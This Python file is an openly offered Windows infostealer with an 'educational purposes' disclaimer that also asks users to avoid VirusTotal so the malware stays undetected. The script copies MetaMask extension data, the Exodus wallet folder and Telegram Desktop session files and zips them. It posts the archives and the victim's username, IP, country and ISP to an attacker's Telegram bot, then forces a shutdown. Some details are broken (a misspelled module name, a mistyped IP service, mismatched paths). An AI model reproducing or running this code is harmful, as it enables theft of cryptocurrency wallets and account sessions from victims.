######################################################################################################################################################
## Disclaimer:                                                                                                                                      ##
##                                                                                                                                                  ##
## This code includes actions that gather personal information, copy data, and send it via Telegram.                                                ##
## Ensure you have proper authorization to perform these actions, as running this script without permission could be illegal and unethical.         ##
## Always handle provided tokens and IDs securely.                                                                                                  ##
## This script is intended for educational purposes only, and I am not responsible for any illegal use of this code.                                ##
## Feel free to modify this code to enhance its capabilities responsibly.                                                                           ##
## Additionally, avoid scanning this file on virustotal.com.                                                                                        ##
## Scanning the file on virustotal.com could lead to its detection and patching by antivirus companies, diminishing its effectiveness.              ##
## Use this code responsibly and ensure you have the right to test or deploy it in your environment.                                                ##
######################################################################################################################################################

import os
import requests
import json
import base64
import sqlite33
import shutil
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from datetime import datetime
import zipfile
import getpass
import pycountry
import pyautogui
import tempfile

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': os.path.join(appdata, 'Amigo', 'User Data'),
    'torch': os.path.join(appdata, 'Torch', 'User Data'),
    'kometa': os.path.join(appdata, 'Kometa', 'User Data'),
    'orbitum': os.path.join(appdata, 'Orbitum', 'User Data'),
    'cent-browser': os.path.join(appdata, 'CentBrowser', 'User Data'),
    '7star': os.path.join(appdata, '7star', '7star', 'User Data'),
    'sputnik': os.path.join(appdata, 'Sputnik', 'Sputnik', 'User Data'),
    'vivaldi': os.path.join(appdata, 'Vivaldi', 'User Data'),
    'google-chrome-sxs': os.path.join(appdata, 'Google', 'Chrome SxS', 'User Data'),
    'google-chrome': os.path.join(appdata, 'Google', 'Chrome', 'User Data'),
    'epic-privacy-browser': os.path.join(appdata, 'Epic Privacy Browser', 'User Data'),
    'microsoft-edge': os.path.join(appdata, 'Microsoft', 'Edge', 'User Data'),
    'uran': os.path.join(appdata, 'uCozMedia', 'Uran', 'User Data'),
    'yandex': os.path.join(appdata, 'Yandex', 'YandexBrowser', 'User Data'),
    'brave': os.path.join(appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'iridium': os.path.join(appdata, 'Iridum', 'User Data'),
}

username = getpass.getuser()
ip_address = requests.get('https://api.ipfy.org').text
response = requests.get(f'https://ip-api.com/json/{ip_address}')
country_code = response.json().get('countryCode', '')
country = pycountry.countries.get(alpha_2=country_code)
isp = response.json().get('isp', '')

extensions_folder = os.path.join("C:\\Users", getpass.getuser(), "Appdata", "Local", "Google", "Chrome", "User Data", "Default", "Extensions")
has_metamask = 'nkbihfbeogaeaoehlefnkodbefgpgknn' in os.listdir(extensions_folder)
has_exodus = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Exodus'))
has_ledger = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Ledger Live'))
has_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))

TELEGRAM_TOKEN = ''
TELEGRAM_CHAT_ID = ''
TELEGRAM_CHAT_ID_NOTIF = ''

def send_notification_telegram(message):
    try:
        url = f'https://api.telegram.org/bot/{TELEGRAM_TOKEN}/sendMessage'
        params = {'chat_id': TELEGRAM_CHAT_ID_NOTIF, 'text': message}
        response = requests.post(url, data=params)
        if response.status_code == 200:
            print("Notification has been sent successfully via Telegram!")
        else:
            print("Failed to send the notification via Telegram!")
    except Exception as e:
        print(f"Error sending notification via Telegram: {e}")

def metamask(args, brow, count):
    try:
        if os.path.exists(args):
            shutil.copytree(args, os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"))
            print(f"New Wallet found! : Total: {count}\nWallet: Metamask_{brow}")
    except shutil.Error:
        pass
    
    try:
        shutil.make_archive(os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"), "zip", os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"))

        zip_file_path = os.path.join(user, f"AppData\\Local\\Metamask_{brow}.zip")
        if os.path.exists(zip_file_path):
            with open(zip_file_path, "rb") as f:
                payload = {"document": (zip_file_path, f, "application/zip")}
                response = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    files=payload,
                    data={"chat_id": TELEGRAM_CHAT_ID},
                )

                if response.status_code == 200:
                    print(f"MetaMask_{brow} archive successfully sent via Telegram.")
                else:
                    print(f"Failed to send MetaMask_{brow} archive via Telegram.")
        else:
            print(f"MetaMask_{brow} archive Not Found! No data has been sent.")

        os.remove(zip_file_path)
        shutil.rmtree(os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"))

    except Exception as e:
        print(f"Error handling MetaMask_{brow}: {e}")

def metamask_search():
    meta_paths = [
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm", "Edge"],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Edge"],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Brave"],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Google"],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "OperaGX"]
    ]

    count = 0
    try:
        for path, browser in meta_paths:
            if os.path.exists(path):
                metamask(path, browser=browser, count=count)
                count += 1
    except IndexError:
        pass

def exodus():
    if os.path.exists(os.path.join(user, "AppData\\Roaming\\Exodus")):
        try:
            shutil.copytree(os.path.join(user, "AppData\\Roaming\\Exodus"), os.path.join(user, "AppData\\Local\\Temp\\Exodus"))
            shutil.make_archive(os.path.join(user, "AppData\\Local\\Temp\\Exodus"), "zip", os.path.join(user, "AppData\\Local\\Temp\\Exodus"))

            zip_file_path = os.path.join(user, "\\AppData\\Local\\Temp\\Exodus.zip")
            if os.path.exists(zip_file_path):
                with open(zip_file_path, "rb") as f:
                    payload = {"document": (zip_file_path, f, "application/zip")}
                    response = requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                        files=payload,
                        data={"chat_id": TELEGRAM_CHAT_ID},
                    )

                    if response.status_code == 200:
                        print("Exodus archive successfully sent via Telegram.")
                    else:
                        print("Failed to send Exodus archive via Telegram.")
            else:
                print("Exodus archive not found. No data has been sent.")

            try:
                os.remove(zip_file_path)
                shutil.rmtree(os.path.join(user, "AppData\\Local\\Temp\\Exodus"))
            except Exception as e:
                print(f"Error managing temporary Exodus archive: {e}")

        except Exception as e:
            print(f"Error with Exodus: {e}")

def telegram():
    if os.path.exists(os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")):
        try:
            tdata_dir = os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")
            user_data_dirs = [f for f in os.listdir(tdata_dir) if os.path.isdir(os.path.join(tdata_dir, f)) and f.startswith("user_data")]

            ignore_items = shutil.ignore_patterns(*user_data_dirs, "emoji", "working")

            with tempfile.TemporaryDirectory() as temp_dir:
                shutil.copytree(
                    tdata_dir,
                    os.path.join(temp_dir, "tdata_session"),
                    ignore=ignore_items,
                )

                zip_file_path = os.path.join(temp_dir, "tdata_session.zip")
                shutil.make_archive(
                        os.path.join(temp_dir, "tdata_session"),
                        "zip",
                        os.path.join(temp_dir, "tdata_session"),
                    )
                
                if os.path.exists(zip_file_path):
                    with open(zip_file_path, "rb") as f:
                        payload = {"document": (zip_file_path, f, "application/zip")}
                        response = requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                            files=payload,
                            data={"chat_id": TELEGRAM_CHAT_ID},
                        )

                        if response.status_code == 200:
                            print("Telegram session archive successfully sent via Telegram.")
                        else:
                            print("Failed to send Telegram session archive via Telegram.")
                else:
                    print("Telegram session archive not found. No data has been sent.")

                os.remove(zip_file_path)
        except Exception as e:
            print(f"Error with Telegram: {e}")

if __name__ == '__main__':
    metamask_search()
    exodus()
    telegram()

    details = {
        'Computer Name': os.getenv('COMPUTERNAME'),
        'Username': username,
        'IP Address': ip_address,
        'Country': country.name if country else 'Unknown',
        'ISP': isp,
        'MetaMask Installed': has_metamask,
        'Exodus Installed': has_exodus,
        'Ledger Installed': has_ledger,
        'Telegram Installed': has_telegram,
    }

    details_str = '\n'.join([f'{k}: {v}' for k, v in details.items()])

    send_notification_telegram(details_str)

    print("Details:\n", details_str)
    pyautogui.hotkey('winleft', 'r')
    pyautogui.write('cmd')
    pyautogui.press('enter')
    pyautogui.write('shutdown /s /f /t 10')
    pyautogui.press('enter')
